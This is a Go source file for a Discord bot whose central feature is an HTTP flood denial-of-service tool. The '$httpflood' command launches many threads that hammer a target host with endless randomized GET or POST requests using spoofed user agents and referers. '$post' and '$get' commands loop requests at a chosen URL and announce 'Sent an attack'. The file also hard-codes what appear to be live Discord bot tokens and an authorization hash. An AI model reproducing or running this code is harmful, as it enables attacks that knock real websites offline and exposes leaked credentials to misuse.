package main

import (
	"bufio"
	"bytes"
	"crypto/tls"
	"encoding/base64"
	"fmt"
	"github.com/Clinet/discordgo-embed"
	"github.com/bwmarrin/discordgo"
	"io"
	"io/ioutil"
	"log"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"strconv"
	"strings"
	"time"
)

var (
	host      = ""
	port      = "80"
	page      = ""
	mode      = ""
	abcd      = "asdfghjklqwertyuiopzxcvbnmASDFGHJKLQWERTYUIOPZXCVBNM"
	start     = make(chan bool)
	acceptall = []string{
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
		"Accept-Encoding: gzip, deflate\r\n",
		"Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
		"Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
		"Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
		"Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
		"Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",
		"Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
		"Accept: text/html, application/xhtml+xml",
		"Accept-Language: en-US,en;q=0.5\r\n",
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
		"Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n"}
	key     string
	choice  = []string{"Macintosh", "Windows", "X11"}
	choice2 = []string{"68K", "PPC", "Intel Mac OS X"}
	choice3 = []string{"Win3.11", "WinNT3.51", "WinNT4.0", "Windows NT 5.0", "Windows NT 5.1", "Windows NT 5.2", "Windows NT 6.0", "Windows NT 6.1", "Windows NT 6.2", "Win 9x 4.90", "WindowsCE", "Windows XP", "Windows 7", "Windows 8", "Windows NT 10.0; Win64; x64"}
	choice4 = []string{"Linux i686", "Linux x86_64"}
	choice5 = []string{"chrome", "spider", "ie"}
	choice6 = []string{".NET CLR", "SV1", "Tablet PC", "Win64; IA64", "Win64; x64", "WOW64"}
	spider  = []string{
		"AdsBot-Google ( http://www.google.com/adsbot.html)",
		"Baiduspider ( http://www.baidu.com/search/spider.htm)",
		"FeedFetcher-Google; ( http://www.google.com/feedfetcher.html)",
		"Googlebot/2.1 ( http://www.googlebot.com/bot.html)",
		"Googlebot-Image/1.0",
		"Googlebot-News",
		"Googlebot-Video/1.0",
	}
	referers = []string{
		"https://www.google.com/search?q=",
		"https://check-host.net/",
		"https://www.facebook.com/",
		"https://www.youtube.com/",
		"https://www.fbi.com/",
		"https://www.bing.com/search?q=",
		"https://r.search.yahoo.com/",
		"https://www.cia.gov/index.html",
		"https://vk.com/profile.php?auto=",
		"https://www.usatoday.com/search/results?q=",
		"https://help.baidu.com/searchResult?keywords=",
		"https://steamcommunity.com/market/search?q=",
		"https://www.ted.com/search?q=",
		"https://play.google.com/store/search?q=",
	}
)

const token string = "ODEwNDUzNjE2Nzg2NjY5NTk4.YCj3vw.B9y6DGywSfljbjc4Us-geuhPwH0"

var BotID string
var GuildID string = "807554468468097024"

var nilYes string = "nil"

var messageSent int

var prefix string = "$"

var (
	spamEnabled bool = true
)

func init() {
	rand.Seed(time.Now().UnixNano()) //fixed seed problem
}
func getuseragent() string {

	platform := choice[rand.Intn(len(choice))]
	var os string
	if platform == "Macintosh" {
		os = choice2[rand.Intn(len(choice2)-1)]
	} else if platform == "Windows" {
		os = choice3[rand.Intn(len(choice3)-1)]
	} else if platform == "X11" {
		os = choice4[rand.Intn(len(choice4)-1)]
	}
	browser := choice5[rand.Intn(len(choice5)-1)]
	if browser == "chrome" {
		webkit := strconv.Itoa(rand.Intn(599-500) + 500)
		uwu := strconv.Itoa(rand.Intn(99)) + ".0" + strconv.Itoa(rand.Intn(9999)) + "." + strconv.Itoa(rand.Intn(999))
		return "Mozilla/5.0 (" + os + ") AppleWebKit/" + webkit + ".0 (KHTML, like Gecko) Chrome/" + uwu + " Safari/" + webkit
	} else if browser == "ie" {
		uwu := strconv.Itoa(rand.Intn(99)) + ".0"
		engine := strconv.Itoa(rand.Intn(99)) + ".0"
		option := rand.Intn(1)
		var token string
		if option == 1 {
			token = choice6[rand.Intn(len(choice6)-1)] + "; "
		} else {
			token = ""
		}
		return "Mozilla/5.0 (compatible; MSIE " + uwu + "; " + os + "; " + token + "Trident/" + engine + ")"
	}
	return spider[rand.Intn(len(spider))]
}

func contain(char string, x string) int { //simple compare
	times := 0
	ans := 0
	for i := 0; i < len(char); i++ {
		if char[times] == x[0] {
			ans = 1
		}
		times++
	}
	return ans
}

func flood() {
	addr := host + ":" + port
	header := ""
	if mode == "get" {
		header += " HTTP/1.1\r\nHost: "
		header += addr + "\r\n"
		if nilYes == "nil" {
			header += "Connection: Keep-Alive\r\nCache-Control: max-age=0\r\n"
			header += "User-Agent: " + getuseragent() + "\r\n"
			header += acceptall[rand.Intn(len(acceptall))]
			header += referers[rand.Intn(len(referers))] + "\r\n"
		} else {
			func() {
				fi, err := os.Open(os.Args[5])
				if err != nil {
					fmt.Printf("Error: %s\n", err)
					return
				}
				defer fi.Close()
				br := bufio.NewReader(fi)
				for {
					a, _, c := br.ReadLine()
					if c == io.EOF {
						break
					}
					header += string(a) + "\r\n"
				}
			}()
		}
	} else if mode == "post" {
		data := ""
		if "" != "nil" {
			func() {
				fi, err := os.Open(os.Args[5])
				if err != nil {
					fmt.Printf("Error: %s\n", err)
					return
				}
				defer fi.Close()
				br := bufio.NewReader(fi)
				for {
					a, _, c := br.ReadLine()
					if c == io.EOF {
						break
					}
					header += string(a) + "\r\n"
				}
			}()

		} else {
			data = "f"
		}
		header += "POST " + page + " HTTP/1.1\r\nHost: " + addr + "\r\n"
		header += "Connection: Keep-Alive\r\nContent-Type: x-www-form-urlencoded\r\nContent-Length: " + strconv.Itoa(len(data)) + "\r\n"
		header += "Accept-Encoding: gzip, deflate\r\n\n" + data + "\r\n"
	}
	var s net.Conn
	var err error
	<-start //received signal
	for {
		if port == "443" {
			cfg := &tls.Config{
				InsecureSkipVerify: true,
				ServerName:         host, //simple fix
			}
			s, err = tls.Dial("tcp", addr, cfg)
		} else {
			s, err = net.Dial("tcp", addr)
		}
		if err != nil {
		} else {
			for {
				request := ""
				if "get" == "get" {
					request += "GET " + page + key
					request += strconv.Itoa(rand.Intn(2147483647)) + string(string(abcd[rand.Intn(len(abcd))])) + string(abcd[rand.Intn(len(abcd))]) + string(abcd[rand.Intn(len(abcd))]) + string(abcd[rand.Intn(len(abcd))])
				}
				request += header + "\r\n"
				s.Write([]byte(request))
			}
			s.Close()
		}
		//fmt.Println("Threads@", threads, " Hitting Target -->", url)// For those who like share to skid.
	}
}
func main() {
	log.Println("Connecting to lunaSec")
	discord, err := discordgo.New("Bot " + token)
	if err != nil {
		fmt.Println(err.Error())
		return
	}
	u, err := discord.User("@me")

	if err != nil {
		fmt.Println(err.Error())
		return
	}

	BotID = u.ID

	discord.AddHandler(MessageHandler)
	discord.AddHandler(guildCreate)
	err = discord.Open()

	if err != nil {
		fmt.Println(err.Error())
		return
	}
	log.Println("Connected | lunaSec is now running")

	<-make(chan struct{})
	return
}

func MessageHandler(s *discordgo.Session, m *discordgo.MessageCreate) {

	scanWord, _ := os.Open("banned.txt")
	scanner := bufio.NewScanner(scanWord)
	scanner.Split(bufio.ScanLines)

	log.Println(m.Author.Username+" >", m.Content)

	if strings.HasPrefix(m.Message.Content, prefix+"tfollow ") {
		if m.ChannelID == "810561944867962921" {
			word := strings.Fields(m.Message.Content)
			log.Printf("Sending 15 twitch followers to %s!", word[1])
			s.ChannelMessageSendEmbed(m.ChannelID, embed.NewGenericEmbedAdvanced("", "Sending 15 twitch followers to "+word[1]+"!", 0x6002EE))
		}
	}

	if strings.HasPrefix(m.Message.Content, prefix+"decode ") {
		decode := strings.Fields(m.Message.Content)
		decoded, _ := base64.StdEncoding.DecodeString(decode[1])
		log.Printf("Result: %s", decoded)
		s.ChannelMessageSendEmbed(m.ChannelID, embed.NewGenericEmbedAdvanced("", "Result: "+string(decoded), 0x6002EE))
	}

	if strings.HasPrefix(m.Message.Content, prefix+"encode ") {
		encode := strings.Fields(m.Message.Content)
		encoded := base64.StdEncoding.EncodeToString([]byte(encode[1]))
		log.Printf("Result: %s", encoded)
		s.ChannelMessageSendEmbed(m.ChannelID, embed.NewGenericEmbedAdvanced("", "Result: "+string(encoded), 0x6002EE))
	}

	if strings.HasPrefix(m.Message.Content, prefix+"nick"+""+" ") {
		nick := strings.Fields(m.Message.Content)
		log.Printf("Changed the nickname for: %s", nick[1])
		s.ChannelMessageSendEmbed(m.ChannelID, embed.NewGenericEmbedAdvanced("", "Changed the nickname for: "+nick[1]+" | Changed: "+nick[2], 0x6002EE))
	}

	if strings.HasPrefix(m.Message.Content, prefix+"api") {
		s.ChannelMessageSend(m.ChannelID, discordgo.EndpointGuildMembers(GuildID)+"\n"+discordgo.EndpointChannelMessagesPins(GuildID))
	}

	if strings.HasPrefix(m.Message.Content, prefix+"post") {

		postUrl := strings.Fields(m.Message.Content)

		log.Println(len(postUrl))
		if 3 < 0 || 3 >= len(postUrl) {
			s.ChannelMessageSendEmbed(m.ChannelID, embed.NewGenericEmbedAdvanced("", "Post Usage: "+prefix+"post {url} {payload} {spam}/{nil}", 0x6002EE))
			return
		} else {
			if postUrl[3] == "spam" {
				s.ChannelMessageSendEmbed(m.ChannelID, embed.NewGenericEmbedAdvanced("POST: Sent an attack", "Method: POST\nUrl: "+postUrl[1]+"\nPayload: "+postUrl[2]+"\nType "+prefix+"stop to cancel the attack", 0x6002EE))
				for {
					var postData = []byte(postUrl[2])

					req, _ := http.NewRequest("POST", postUrl[1], bytes.NewBuffer(postData))

					req.Header.Set("Authorization", "SAPISIDHASH 1613401548_47ad8b5acc6804648ccb11b5d34da2c75c969cd6")
					log.Println("Sending Requests at " + postUrl[1])
				}
			}
			if postUrl[3] != "spam" {
				s.ChannelMessageSendEmbed(m.ChannelID, embed.NewGenericEmbedAdvanced("", "Post: Missing parameters", 0x6002EE))
			}
		}
	}

	if strings.HasPrefix(m.Message.Content, prefix+"get") {

		postUrl := strings.Fields(m.Message.Content)

		log.Println(len(postUrl))
		if 3 < 0 || 3 >= len(postUrl) {
			s.ChannelMessageSendEmbed(m.ChannelID, embed.NewGenericEmbedAdvanced("", "Get Usage: "+prefix+"get {url {spam}/{nil}", 0x6002EE))
			return
		}

		if postUrl[3] == "spam" {
			s.ChannelMessageSendEmbed(m.ChannelID, embed.NewGenericEmbedAdvanced("GET: Sent an attack", "Method: GET\nUrl: "+postUrl[1]+"\nType "+prefix+"stop to cancel the attack", 0x6002EE))
			for {
				var postData = []byte(postUrl[2])

				req, _ := http.NewRequest("GET", postUrl[1], bytes.NewBuffer(postData))

				req.Header.Set("Authorization", "SAPISIDHASH 1613401548_47ad8b5acc6804648ccb11b5d34da2c75c969cd6")
				log.Println("Sending Requests at " + postUrl[1])
			}
		}
		if postUrl[3] != "spam" {
			s.ChannelMessageSendEmbed(m.ChannelID, embed.NewGenericEmbedAdvanced("", "Get: Missing parameters", 0x6002EE))
		}
	}

	if strings.HasPrefix(m.Message.Content, prefix+"help") {
		s.ChannelMessageSendEmbed(m.ChannelID, embed.NewGenericEmbedAdvanced("HTTP", ""+prefix+"post <url> <payload> <flood/nil>\n"+""+prefix+"get <url>\n"+prefix+"httpflood <url> <threads> <header/nil>", 0x6002EE))
		s.ChannelMessageSendEmbed(m.ChannelID, embed.NewGenericEmbedAdvanced("ENCODING", ""+prefix+"encode <text>\n"+prefix+"decode <base64>", 0x6002EE))
	}

	if strings.HasPrefix(m.Message.Content, prefix+"prefix") {
		s.ChannelMessageSendEmbed(m.ChannelID, embed.NewGenericEmbedAdvanced("", "My current prefix is '"+prefix+"'", 0x6002EE))
	}

	if strings.HasPrefix(m.Message.Content, prefix+"speak") {

	}

	if strings.HasPrefix(m.Message.Content, prefix+"announce") {

		announceMessage := strings.Fields(m.Message.Content)

		s.ChannelMessageSendEmbed(announceMessage[1], embed.NewGenericEmbedAdvanced("Announcement!", announceMessage[2], 0x6002EE))
	}

	if strings.HasPrefix(m.Message.Content, prefix+"shibe") {
		var postData = []byte(`` + strconv.Itoa(rand.Intn(2147483648)) + `","permission_overwrites":[]}`)

		req, _ := http.NewRequest("GET", "http://shibe.online/api/shibes?count=[1-100]&urls=[true/false]&httpsUrls=[true/false]", bytes.NewBuffer(postData))

		req.Header.Set("authorization", "NjE3Mjc2NDM2Mjc2ODM4NDEw.YCqMbg.i_Xs36A15HlznSkBDXW304kMyFU")

		client := &http.Client{}
		res, _ := client.Do(req)
		body, _ := ioutil.ReadAll(res.Body)
		re := regexp.MustCompile(`"(.*)"`)
		match := re.FindStringSubmatch(string(body))
		s.ChannelMessageSend(m.ChannelID, "https://cdn.shibe.online/shibes/"+match[1]+".jpg")
	}

	if strings.HasPrefix(m.Message.Content, prefix+"say") {

		Message := strings.Fields(m.Message.Content)

		s.ChannelMessageSend(m.ChannelID, Message[1])
	}

	if strings.HasPrefix(m.Message.Content, prefix+"gamestatus") {
		statusTxT := strings.Fields(m.Message.Content)
		s.UpdateGameStatus(0, statusTxT[1])

	}

	if strings.HasPrefix(m.Message.Content, prefix+"httpflood") {

		urlDown := strings.Fields(m.Message.Content)

		log.Println(len(urlDown))
		if 5 < 0 || 5 >= len(urlDown) {
			s.ChannelMessageSendEmbed(m.ChannelID, embed.NewGenericEmbedAdvanced("HttpFlood Info!", "Post Mode will use header.txt as data\nIf you are using linux please run 'ulimit -n 999999' first!!!\nUsage: /httpflood <url> <threads> <get/post> <seconds> <header.txt/nil>", 0x6002EE))
			return
		} else {
			u, err := url.Parse(urlDown[1])
			if err != nil {
				s.ChannelMessageSendEmbed(m.ChannelID, embed.NewGenericEmbedAdvanced("HttpFlood Info!", "Please input a correct url", 0x6002EE))
			}
			tmp := strings.Split(u.Host, ":")
			host = tmp[0]
			if u.Scheme == "https" {
				port = "443"
			} else {
				port = u.Port()
			}
			if port == "" {
				port = "80"
			}
			page = u.Path
			if urlDown[3] != "get" && urlDown[3] != "post" {
				s.ChannelMessageSendEmbed(m.ChannelID, embed.NewGenericEmbedAdvanced("HttpFlood Info!", "Wrong mode, Only can use \"get\" or \"post\"", 0x6002EE))
				return
			}
			mode = urlDown[3]
			threads, err := strconv.Atoi(urlDown[2])
			if err != nil {
				s.ChannelMessageSendEmbed(m.ChannelID, embed.NewGenericEmbedAdvanced("HttpFlood Info!", "Threads should be a integer", 0x6002EE))
			}
			limit, err := strconv.Atoi(urlDown[4])
			if err != nil {
				s.ChannelMessageSendEmbed(m.ChannelID, embed.NewGenericEmbedAdvanced("HttpFlood Info!", "limit should be a integer", 0x6002EE))
			}
			if contain(page, "?") == 0 {
				key = "?"
			} else {
				key = "&"
			}
			for i := 0; i < threads; i++ {
				time.Sleep(time.Microsecond * 100)
				go flood() // Start threads
				os.Stdout.Sync()
				//time.Sleep( time.Millisecond * 1)
			}
			s.ChannelMessageSendEmbed(m.ChannelID, embed.NewGenericEmbedAdvanced("HTTPFlood: Sent an attack", "Method: "+urlDown[3]+"\nUrl: "+urlDown[1]+"\nDuration: "+urlDown[4]+"\nThreads: "+urlDown[2]+"\nType "+prefix+"stop to cancel the attack", 0x6002EE))
			time.Sleep(time.Duration(limit) * time.Second)
		}
	}

}

func guildCreate(s *discordgo.Session, event *discordgo.GuildCreate) {

	if event.Guild.Unavailable {
		return
	}

	for _, channel := range event.Guild.Channels {
		if channel.ID == event.Guild.ID {
			_, _ = s.ChannelMessageSend(channel.ID, "Airhorn is ready! Type !airhorn while in a voice channel to play a sound.")
			return
		}
	}
}
